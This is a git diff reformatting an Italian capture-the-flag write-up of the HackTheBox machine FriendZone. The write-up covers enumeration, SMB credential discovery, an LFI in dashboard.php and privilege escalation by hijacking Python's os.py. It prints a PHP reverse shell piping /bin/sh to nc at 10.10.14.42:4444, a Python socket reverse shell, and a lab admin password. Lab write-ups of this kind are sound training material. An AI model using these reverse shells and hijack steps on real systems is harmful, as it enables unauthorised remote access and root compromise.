@@ -1,8 +1,11 @@
+# FirendZone
+
 **TARGET:10.10.10.123**
 
-# INFORMATION GATHERING
+## INFORMATION GATHERING
 
-Per prima cosa lanciamo un rapido scan con [[Nmap]]
+Per prima cosa lanciamo un rapido scan con \[\[Nmap]]
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/friendzone]                                      
 └─# nmap -sC -sV -O -min-rate=5000 10.10.10.123                                  
@@ -78,16 +81,15 @@ Nmap done: 1 IP address (1 host up) scanned in 37.69 seconds
 
 ```
 
-Un ulteriore scan su tutte le porte non ci da nessuna nuova informazione
-Quindi ricapitolando abbiamo 
+Un ulteriore scan su tutte le porte non ci da nessuna nuova informazione Quindi ricapitolando abbiamo
 
-- **Port 21:**  ftp vsftpd 3.0.3
-- **Port 22**: OpenSSH 7.6p1 Ubuntu 4
-- **Port 53:** ISC BIND 9.11.3–1ubuntu1.2 (DNS)
-- **Ports 80 & 443**: Apache httpd 2.4
-- **Ports 139 and 145:** Samba smbd 4.7.6-Ubuntu
+* **Port 21:**  ftp vsftpd 3.0.3
+* **Port 22**: OpenSSH 7.6p1 Ubuntu 4
+* **Port 53:** ISC BIND 9.11.3–1ubuntu1.2 (DNS)
+* **Ports 80 & 443**: Apache httpd 2.4
+* **Ports 139 and 145:** Samba smbd 4.7.6-Ubuntu
 
-La Porta 21 esegue una versione di vsfpd non vulnerabile ( le versione vulnerabili sono quelle 2.x.x) quindi avremmo bisogno di credenziali che per il momento non abbiamo 
+La Porta 21 esegue una versione di vsfpd non vulnerabile ( le versione vulnerabili sono quelle 2.x.x) quindi avremmo bisogno di credenziali che per il momento non abbiamo
 
 La porta 22 analogamente a FTP, non ci sono molti exploit critici associati alla versione di SSH utilizzata, quindi avremo bisogno anche delle credenziali per questo servizio.
 
@@ -97,15 +99,13 @@ Le porte 80 e 443 mostrano titoli di pagina diversi. Questa potrebbe essere una 
 
 Le porte SMB sono aperte. Dobbiamo svolgere le solite attività: controllare l'accesso anonimo, elencare le condivisioni e controllare i permessi sulle condivisioni.
 
-# ENUMERATION
+## ENUMERATION
 
-## Port 80 & 443 HTTP/S
+### Port 80 & 443 HTTP/S
 
-Iniziamo dalla porta 80 
-Visitando la pagina web possiamo vedere che l'e-mail è info@friendzoneportal.red. Il friendzoneportal.red potrebbe essere un possibile nome di dominio. Lo terremo a mente durante l'enumerazione dei DNS.
-Visualizziamo il codice sorgente per vedere se riusciamo a trovare altre informazioni. ma non c'è nulla di nuovo 
+Iniziamo dalla porta 80 Visitando la pagina web possiamo vedere che l'e-mail è info@friendzoneportal.red. Il friendzoneportal.red potrebbe essere un possibile nome di dominio. Lo terremo a mente durante l'enumerazione dei DNS. Visualizziamo il codice sorgente per vedere se riusciamo a trovare altre informazioni. ma non c'è nulla di nuovo
 
-Proviamo ad enumerare con [[Gobuster]]
+Proviamo ad enumerare con \[\[Gobuster]]
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/friendzone]
@@ -137,7 +137,7 @@ La directory /wordpress non fa riferimento ad altri link. Quindi ho eseguito gob
 
 Visitando il sito sulla 443 rieceviamo un errore quindi passiamo ed enumerare il DNS
 
-## Port 53 DNS
+### Port 53 DNS
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/friendzone]
@@ -151,8 +151,9 @@ Address: 10.10.10.123#53
 ```
 
 Non otteniamo nulla proviamo con un zone transfer su i due domini che abbiamo torvato
-- friendzone.red
-- friendzoneportal.red
+
+* friendzone.red
+* friendzoneportal.red
 
 ```bash
 ──(root㉿kali)-[/home/kali/htb/friendzone]
@@ -195,12 +196,9 @@ friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604
 
 aggiungiamo tutti i domini al file /etc/hots e visitiamoli
 
-I seguenti siti ci hanno mostrato risultati particolarmente interessanti.
-https://admin.friendzoneportal.red/ e https://administrator1.friendzone.red/ hanno moduli di accesso.
-https://uploads.friendzone.red/ ti consente di caricare immagini.
-Ho provato le credenziali predefinite sui siti di amministrazione ma non ha funzionato. Prima di eseguire un cracker di password su questi due siti, enumeriamo SMB. Potremmo trovare le credenziali lì.
+I seguenti siti ci hanno mostrato risultati particolarmente interessanti. https://admin.friendzoneportal.red/ e https://administrator1.friendzone.red/ hanno moduli di accesso. https://uploads.friendzone.red/ ti consente di caricare immagini. Ho provato le credenziali predefinite sui siti di amministrazione ma non ha funzionato. Prima di eseguire un cracker di password su questi due siti, enumeriamo SMB. Potremmo trovare le credenziali lì.
 
-## Port 139 & 445 SMB
+### Port 139 & 445 SMB
 
 Partiamo da SQLMAP per vedere a cosa abbiamo accesso e con quali permessi
 
@@ -216,7 +214,8 @@ Development                                             READ, WRITE     FriendZo
 IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
 ```
 
-Rilanciamo smbmap con la flag -R per vedere quali file sono all'interno delle cartelle a cui abbiamo accesso 
+Rilanciamo smbmap con la flag -R per vedere quali file sono all'interno delle cartelle a cui abbiamo accesso
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/friendzone]
 └─# smbmap -R -H 10.10.10.123
@@ -238,8 +237,7 @@ general                                                 READ ONLY       FriendZo
 
 ```
 
-Vediamo che abbiamo un file chaimato creds.txt che sembra molto interessante 
-ci colleghiamo con smbclient con la flag -N ( per non richiedere password)
+Vediamo che abbiamo un file chaimato creds.txt che sembra molto interessante ci colleghiamo con smbclient con la flag -N ( per non richiedere password)
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/friendzone]
@@ -264,28 +262,24 @@ admin:WORKWORKHhallelujah@#
 
 Abbiamo le credenziali admin proviamole
 
-- FTP non sono valide
-- SSH non sono valide
-- [https://admin.friendzoneportal.red/](https://admin.friendzoneportal.red/)ci fa loggare ma è un pagina i work-inprogress
-- https://administrator1.friendzone.red/ siamo dentro ! ci dice di vistare la pagina /dashboard.php
+* FTP non sono valide
+* SSH non sono valide
+* [https://admin.friendzoneportal.red/](https://admin.friendzoneportal.red/)ci fa loggare ma è un pagina i work-inprogress
+* https://administrator1.friendzone.red/ siamo dentro ! ci dice di vistare la pagina /dashboard.php
 
-Visitano /dashboard.php
-Sembra essere una pagina che permette di visualizzare le immagini del sito. Cercheremo di ottenere l'accesso iniziale attraverso questa pagina.
+Visitano /dashboard.php Sembra essere una pagina che permette di visualizzare le immagini del sito. Cercheremo di ottenere l'accesso iniziale attraverso questa pagina.
 
-![[1*sc42Qfcz0hRKipeM3sV1Mw.webp]]
-Come possiamo vedere dice c'è l'immagine di deafult è al seguente indirizzo 
+!\[\[1\*sc42Qfcz0hRKipeM3sV1Mw.webp]] Come possiamo vedere dice c'è l'immagine di deafult è al seguente indirizzo
+
 ```bash
 ?image_id=a.jpg&pagename=timestamp
 ```
 
-![[1*N_ShhPTERcBEUHo5Tj8iEg.webp]]
+!\[\[1\*N\_ShhPTERcBEUHo5Tj8iEg.webp]]
 
-Mettiamo quel numero di timestamp nel parametro URL pagename. Dopo averlo fatto, non riceviamo più un messaggio "Final Access timestamp...".
-Durante la nostra fase di enumerazione, abbiamo trovato un URL https://uploads.friendzone.red/ che ci permette di caricare immagini. Proviamo a vedere se le immagini che carichiamo lì possono essere visualizzate attraverso la pagina del dashboard.
+Mettiamo quel numero di timestamp nel parametro URL pagename. Dopo averlo fatto, non riceviamo più un messaggio "Final Access timestamp...". Durante la nostra fase di enumerazione, abbiamo trovato un URL https://uploads.friendzone.red/ che ci permette di caricare immagini. Proviamo a vedere se le immagini che carichiamo lì possono essere visualizzate attraverso la pagina del dashboard.
 
-No, non trova l'immagine. Spostiamo la nostra attenzione sul parametro pagename. Sembra che stia eseguendo uno script timestamp che genera un timestamp e lo emette sulla pagina. In base al modo in cui l'applicazione funziona attualmente, la mia sensazione istintiva è che prenda il nome del file "timestamp" e vi aggiunga ".php" e quindi esegua quello script. Pertanto, se questo è vulnerabile a LFI, sarebbe difficile divulgare file sensibili poiché l'estensione ".php" verrà aggiunta alla mia query.
-Invece, proviamo prima a caricare un file php e poi a sfruttare la vulnerabilità LFI per produrre qualcosa sulla pagina. Durante la fase di enumerazione, abbiamo scoperto di disporre dei permessi READ e WRITE sulla condivisione Development e che è probabile che i file caricati su tale condivisione siano archiviati nella posizione /etc/Development (in base alla colonna Commenti).
-Creiamo un semplice script test.php che emette la stringa "Funziona!" sulla pagina.
+No, non trova l'immagine. Spostiamo la nostra attenzione sul parametro pagename. Sembra che stia eseguendo uno script timestamp che genera un timestamp e lo emette sulla pagina. In base al modo in cui l'applicazione funziona attualmente, la mia sensazione istintiva è che prenda il nome del file "timestamp" e vi aggiunga ".php" e quindi esegua quello script. Pertanto, se questo è vulnerabile a LFI, sarebbe difficile divulgare file sensibili poiché l'estensione ".php" verrà aggiunta alla mia query. Invece, proviamo prima a caricare un file php e poi a sfruttare la vulnerabilità LFI per produrre qualcosa sulla pagina. Durante la fase di enumerazione, abbiamo scoperto di disporre dei permessi READ e WRITE sulla condivisione Development e che è probabile che i file caricati su tale condivisione siano archiviati nella posizione /etc/Development (in base alla colonna Commenti). Creiamo un semplice script test.php che emette la stringa "Funziona!" sulla pagina.
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/friendzone]
@@ -296,6 +290,7 @@ echo "It's working!";
 ```
 
 con smbclient lo carichiamo nella condivisione Development
+
 ```bash
 
 ┌──(root㉿kali)-[/home/kali/htb/friendzone]
@@ -318,19 +313,21 @@ smb: \>
 
 ```
 
-navighiamo alla pagina, https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
->abbiamo sostituito il paramentro pageneme= con il percorso del file test
+navighiamo alla pagina, https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=/etc/Development/test
 
-![[1*pDOjwlUQ3_JF_xKFEre1ug.webp]]
+> abbiamo sostituito il paramentro pageneme= con il percorso del file test
 
-Funziona !! non ci resta che creare un revshell in php metterci in ascolto con nc e dovremmo esserci 
+!\[\[1\*pDOjwlUQ3\_JF\_xKFEre1ug.webp]]
+
+Funziona !! non ci resta che creare un revshell in php metterci in ascolto con nc e dovremmo esserci
 
 Revshell.php
+
 ```bash
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.42 4444 >/tmp/f"); ?>
 ```
 
-La carichiamo sulla condivisione 
+La carichiamo sulla condivisione
 
 ```bash
 smb: \> put revers.php 
@@ -352,8 +349,8 @@ Ci mettiamo in ascolto con nc
 listening on [any] 4444 ...
 ```
 
-Visitiamo la pagina 
-https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/revers
+Visitiamo la pagina https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=/etc/Development/revers
+
 > Ricordiamoci di non mettere il .php dopo revers
 
 Otteniamo cosi la nostra shell
@@ -385,6 +382,7 @@ www-data@FriendZone:/var/www$
 ```
 
 Troviamo quelle che sembrano le credenziali dell'utente frined
+
 ```bash
 www-data@FriendZone:/var/www$ ls
 admin       friendzoneportal       html             uploads
@@ -405,9 +403,7 @@ www-data@FriendZone:/home/friend$ cat user.txt
 490aa9b40e10cef2b1294ac7ab55c884
 ```
 
-
-
-# PRIVESC
+## PRIVESC
 
 Ci scarichiamo pspy(https://vk9-sec.com/how-to-enumerate-services-in-use-with-pspy/)
 
@@ -463,7 +459,7 @@ putting file pspy as \pspy64 (1037.6 kb/s) (average 982.3 kb/s)
 
 ```
 
-Dalla nostra shell gli diamo i privilegi d'esecuzione ma sembra che non abbiamo i permessi per farlo 
+Dalla nostra shell gli diamo i privilegi d'esecuzione ma sembra che non abbiamo i permessi per farlo
 
 ```bash
 www-data@FriendZone:/$ cd etc/Development/
@@ -493,6 +489,7 @@ www-data@FriendZone:/tmp$ chmod +x pspy
 ```
 
 Dopo aver esegutio pspy otteniamo il seguente output
+
 ```bash
 2023/06/09 00:06:15 CMD: UID=0     PID=1      | /sbin/init splash 
 2023/06/09 00:08:00 CMD: UID=0     PID=1080   | /usr/sbin/smbd --foreground --no-process-group 
@@ -503,6 +500,7 @@ Dopo aver esegutio pspy otteniamo il seguente output
 ```
 
 andiamo a vedere il file "reporter..py"
+
 ```python
 friend@FriendZone:cat /opt/server:_admin/reporter.py_
 
@@ -517,6 +515,7 @@ print "[+] Trying to send email to %s"%to_address
 #os.system(command) # I need to edit the script later 
 # Sam ~ python developer
 ```
+
 La maggior parte della sceneggiatura è commentata, quindi non c'è molto da fare lì. Importa il modulo os. Forse possiamo dirottarlo. Individuiamo il modulo sulla macchina e vediamo se abbiamo i permessi di scrittura sul file.
 
 ```bash
@@ -525,7 +524,7 @@ friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os.py
 -rw-r--r--  1 root root  25917 Jun  8 15:34 os.pyc
 ```
 
-Perfetto abbiamo i permessi di scrittura non ci resta cha modificare il file aggiungendo una revshell infondo al file 
+Perfetto abbiamo i permessi di scrittura non ci resta cha modificare il file aggiungendo una revshell infondo al file
 
 ```bash
 import socket,subprocess,os;  
@@ -562,7 +561,7 @@ root.txt
 
 ```
 
-# LESSON LEARNED
+## LESSON LEARNED
 
 Per ottenere un punto d'appoggio iniziale sulla scatola abbiamo sfruttato sei vulnerabilità.
 
